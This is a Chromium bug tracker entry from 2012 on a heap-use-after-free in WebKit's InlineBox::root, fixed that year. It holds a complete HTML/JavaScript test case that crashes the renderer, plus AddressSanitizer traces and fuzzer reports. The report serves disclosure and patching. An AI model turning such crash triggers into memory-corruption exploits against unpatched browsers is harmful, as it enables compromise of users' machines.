# Heap-use-after-free in WebCore::InlineBox::root

| Field | Value |
|-------|-------|
| **Issue ID** | [40054783](https://issues.chromium.org/issues/40054783) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-03-11 |
| **Bounty** | $1,000.00 |

## Description

**This template is ONLY for reporting security bugs. Please use a different**  

**template for other types of bug reports.**  

**VULNERABILITY DETAILS**

like 113902 but not fixed

**VERSION**  

Chrome Version: dev (and others)

Chromium 19.0.1067.0 (Developer Build 126075)  

OS Linux  

WebKit 536.3 (trunk@110387)  

JavaScript V8 3.9.13

Operating System: 64bit ubuntu

**REPRODUCTION CASE**

<html>
<head>
<style>
#el1 {
-webkit-appearance: list-button;
}
#el2 {
height: 1px;
}
#el3 {
width: 100px;
}
</style>
<script>
onload = function() {
el0 = document.createElement('div')
document.body.appendChild(el0)
el1 = document.createElement('div')
el1.setAttribute('id', 'el1')
el0.appendChild(el1)
el0.appendChild(document.createTextNode('A'))
el2 = document.createElement('div')
el2.setAttribute('id', 'el2')
el1.appendChild(el2)
el3 = document.createElement('div')
el3.setAttribute('id', 'el3')
el1.appendChild(el3)
el3.appendChild(document.createTextNode('A'))
el0.style.display='table-caption'
el1.style.display='table-footer-group'
el2.style.display='run-in'
el3.style.display='inline'
document.designMode='on'
document.execCommand('selectall')
document.execCommand('italic')
el1.style.display='run-in'
document.execCommand('removeFormat')
document.execCommand('selectall')
document.execCommand('italic')
el1.style.display='table-row'
document.body.offsetTop
el3.style.display='block'
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==24495== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffecb0ac98 at pc 0x55555aa10ba5 bp 0x7fffffff4300 sp 0x7fffffff42f8  

READ of size 8 at 0x7fffecb0ac98 thread T0  

#0 0x55555aa10ba5 in WebCore::InlineBox::root() ???:0  

#1 0x55555aa2c7af in WebCore::InlineTextBox::localSelectionRect(int, int) ???:0  

#2 0x55555ad34953 in WebCore::RenderText::selectionRectForRepaint(WebCore::RenderBoxModelObject\*, bool) ???:0

0x7fffecb0ac98 is located 24 bytes inside of 152-byte region [0x7fffecb0ac80,0x7fffecb0ad18)  

freed by thread T0 here:  

#0 0x55555dd0db72 in free ??:0  

#1 0x55555ac533a5 in WebCore::RenderLineBoxList::deleteLineBoxes(WebCore::RenderArena\*) ???:0  

#2 0x55555aadcecf in WebCore::RenderBlock::layoutInlineChildren(bool, int&, int&) ???:0  

#3 0x55555aa55cda in WebCore::RenderBlock::layoutBlock(bool, int, WebCore::RenderBlock::BlockLayoutPass) ???:0

## Attachments

- [24152.html](attachments/24152.html) (text/html; charset=us-ascii, 1.3 KB)
- [24152.txt](attachments/24152.txt) (text/x-c; charset=us-ascii, 12.4 KB)

## Timeline

### in...@chromium.org (2012-03-12)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=25480344

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7fe4bcf64898
Crash State:
  - crash stack -
  WebCore::InlineBox::root
  WebCore::InlineTextBox::localSelectionRect
  - free stack -
  WebCore::RenderLineBoxList::deleteLineBoxes
  WebCore::RenderBlock::layoutInlineChildren
  

Minimized Testcase (1.29 Kb): https://cluster-fuzz.appspot.com/download/AMIfv95Jf9wGPQ6Px554K0u2dL8xak2X3S8Olj3sYevaoCSvZtjjnc5TT4CRrMJJT7nD8cu40ONjJ72jobeE-XySQW2XXRD2rviDBf7Fn85l3-PJKy0Gmz79nv_kGu-39SEz3MT8b0giLx1aFkXp99pKaUZ9nKGZ9w

### in...@chromium.org (2012-03-12)

This is completely different variant of 113902.

### in...@chromium.org (2012-03-16)

Upstreamed - https://bugs.webkit.org/show_bug.cgi?id=81359

### in...@chromium.org (2012-03-16)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-03-23)

http://trac.webkit.org/changeset/111899

### cl...@chromium.org (2012-03-25)

ClusterFuzz has detected this issue as fixed in range 128665:128733.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=25480344

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7fe4bcf64898
Crash State:
  - crash stack -
  WebCore::InlineBox::root
  WebCore::InlineTextBox::localSelectionRect
  - free stack -
  WebCore::RenderLineBoxList::deleteLineBoxes
  WebCore::RenderBlock::layoutInlineChildren
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=128665:128733

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv95Jf9wGPQ6Px554K0u2dL8xak2X3S8Olj3sYevaoCSvZtjjnc5TT4CRrMJJT7nD8cu40ONjJ72jobeE-XySQW2XXRD2rviDBf7Fn85l3-PJKy0Gmz79nv_kGu-39SEz3MT8b0giLx1aFkXp99pKaUZ9nKGZ9w

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2012-03-29)

M18: http://trac.webkit.org/changeset/112605

### sc...@gmail.com (2012-04-04)

$1000 etc.

### sc...@gmail.com (2012-05-10)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/117728?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40054783)*
